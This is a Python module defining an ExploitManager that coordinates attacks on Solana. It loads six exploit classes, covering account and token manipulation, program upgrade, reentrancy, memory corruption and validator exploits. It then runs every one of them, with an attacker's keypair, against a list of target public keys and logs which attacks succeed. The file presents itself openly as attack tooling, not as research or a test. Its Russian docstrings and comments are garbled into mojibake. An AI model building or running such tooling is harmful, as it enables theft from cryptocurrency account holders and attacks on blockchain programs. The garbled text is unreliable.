"""
–ú–µ–Ω–µ–¥–∂–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –¥–ª—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ü–∏–∏ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∞—Ç–∞–∫.

–≠—Ç–æ—Ç –º–æ–¥—É–ª—å –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é, —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏ –∑–∞–ø—É—Å–∫ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö
—ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –ø—Ä–æ—Ç–∏–≤ —Ü–µ–ª–µ–≤—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ Solana.
"""

import asyncio
import logging
from typing import Dict, List, Type

from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient

from .base_exploit import BaseExploit, ExploitResult, ExploitStatus, ExploitType
from .account_exploit import AccountExploit
from .token_exploit_fixed import TokenExploitFixed
from .program_exploit import ProgramExploit
from .reentrancy_exploit import ReentrancyExploit
from .memory_exploit import MemoryExploit
from .validator_exploit import ValidatorExploit


class ExploitManager:
    """–ú–µ–Ω–µ–¥–∂–µ—Ä –¥–ª—è –∫–æ–æ—Ä–¥–∏–Ω–∞—Ü–∏–∏ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤."""

    def __init__(self, rpc_url: str, attacker_keypair: Keypair):
        """
        –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç ExploitManager.

        Args:
            rpc_url: URL-–∞–¥—Ä–µ—Å RPC-—Å–µ—Ä–≤–µ—Ä–∞ Solana.
            attacker_keypair: Keypair –∞—Ç–∞–∫—É—é—â–µ–≥–æ.
        """
        self.rpc_url = rpc_url
        self.attacker_keypair = attacker_keypair
        self.logger = logging.getLogger(self.__class__.__name__)
        self.client = AsyncClient(rpc_url)
        self.exploits: Dict[ExploitType, BaseExploit] = {}

        # –ö–∞—Ä—Ç–∞ —Å–æ–ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ç–∏–ø–æ–≤ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ —Å –∏—Ö –∫–ª–∞—Å—Å–∞–º–∏.
        exploit_map: Dict[ExploitType, Type[BaseExploit]] = {
            ExploitType.ACCOUNT_MANIPULATION: AccountExploit,
            ExploitType.TOKEN_MANIPULATION: TokenExploitFixed,
            ExploitType.PROGRAM_UPGRADE: ProgramExploit,
            ExploitType.CROSS_PROGRAM_INVOCATION: ReentrancyExploit,
            ExploitType.MEMORY_CORRUPTION: MemoryExploit,
            ExploitType.VALIDATOR_EXPLOIT: ValidatorExploit,
        }

        self.logger.info("Initializing exploit modules...")
        for exploit_type, exploit_class in exploit_map.items():
            try:
                # –ö–∞–∂–¥—ã–π –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–æ–ª–∂–µ–Ω –ø—Ä–∏–Ω–∏–º–∞—Ç—å AsyncClient –∏ Keypair.
                instance = exploit_class(self.client, self.attacker_keypair)
                self.exploits[exploit_type] = instance
                self.logger.info(f"Successfully initialized '{exploit_class.__name__}'.")
            except Exception as e:
                self.logger.error(f"Failed to initialize '{exploit_class.__name__}': {e}", exc_info=True)

        self.logger.info(f"‚úÖ ExploitManager initialized with {len(self.exploits)} exploit(s).")

    async def run_exploit_campaign(self, target_pubkeys: List[PublicKey]) -> Dict[str, List[ExploitResult]]:
        """
        –ó–∞–ø—É—Å–∫–∞–µ—Ç –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ —ç–∫—Å–ø–ª–æ–π—Ç—ã –ø—Ä–æ—Ç–∏–≤ —Å–ø–∏—Å–∫–∞ —É–∫–∞–∑–∞–Ω–Ω—ã—Ö —Ü–µ–ª–µ–π.

        Args:
            target_pubkeys: –°–ø–∏—Å–æ–∫ PublicKey —Ü–µ–ª–µ–π –¥–ª—è –∞—Ç–∞–∫–∏.

        Returns:
            –°–ª–æ–≤–∞—Ä—å —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –¥–ª—è –∫–∞–∂–¥–æ–π —Ü–µ–ª–∏.
        """
        self.logger.info(f"üöÄ Starting exploit campaign against {len(target_pubkeys)} target(s)...")
        campaign_results: Dict[str, List[ExploitResult]] = {}

        for target_pubkey in target_pubkeys:
            target_str = str(target_pubkey)
            campaign_results[target_str] = []
            self.logger.info(f"üéØ Targeting: {target_str}")

            for exploit_type, exploit_instance in self.exploits.items():
                self.logger.info(f"  -> Running exploit: {exploit_type.value}")
                try:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —É —ç–∫—Å–ø–ª–æ–π—Ç–∞ –µ—Å—Ç—å –º–µ—Ç–æ–¥ run_exploit
                    if hasattr(exploit_instance, 'run_exploit') and callable(getattr(exploit_instance, 'run_exploit')):
                        result = await exploit_instance.run_exploit(target_pubkey)
                        # Defensive: ensure only ExploitResult is added
                        if not hasattr(result, "exploit_type") or not hasattr(result, "status"):
                            result = ExploitResult(
                                exploit_type=exploit_type,
                                status=ExploitStatus.FAILED,
                                target_account=target_str,
                                error_message=f"Invalid result: {result}"
                            )
                        campaign_results[target_str].append(result)
                        if result.status == ExploitStatus.SUCCESS:
                            self.logger.info(f"    ‚úÖ SUCCESS: {exploit_type.value} on {target_str}. Details: {result.details}")
                        else:
                            self.logger.warning(f"    ‚ö†Ô∏è FAILED: {exploit_type.value} on {target_str}. Reason: {result.error_message}")
                    else:
                        error_msg = f"Exploit '{exploit_instance.__class__.__name__}' has no 'run_exploit' method."
                        self.logger.error(f"   ‚ùå ERROR: {error_msg}")
                        campaign_results[target_str].append(ExploitResult(
                            exploit_type=exploit_type,
                            status=ExploitStatus.FAILED,
                            target_account=target_str,
                            error_message=error_msg
                        ))
                except Exception as e:
                    self.logger.error(f"    ‚ùå CRITICAL ERROR running {exploit_type.value}: {e}", exc_info=True)
                    campaign_results[target_str].append(ExploitResult(
                        exploit_type=exploit_type,
                        status=ExploitStatus.FAILED,
                        target_account=target_str,
                        error_message=str(e)
                    ))

        self.logger.info("üèÅ Exploit campaign finished.")
        return campaign_results

    async def close(self):
        """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç –∫–ª–∏–µ–Ω—Ç AsyncClient."""
        await self.client.close()
        self.logger.info("AsyncClient closed.")
